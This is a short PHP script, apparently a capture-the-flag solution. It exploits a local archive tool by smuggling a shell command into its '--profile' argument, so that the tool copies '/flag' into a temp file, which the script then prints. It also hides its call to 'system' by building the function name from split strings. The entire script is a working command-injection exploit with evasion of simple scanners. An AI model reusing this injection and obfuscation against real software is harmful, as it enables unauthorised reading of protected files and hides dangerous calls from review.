<?php
  $tmp = '/tmp/' . bin2hex(random_bytes(4));
  $out = $tmp . '.out';
  $profile = 'sh -c "cat /flag > ' . $out . '" #';
  $cmd = '/usr/local/bin/chw archive --file ' . escapeshellarg($tmp)
       . ' --profile ' . escapeshellarg($profile);
  $f = 'sy' . 'stem';
  $f($cmd);
  echo @file_get_contents($out);
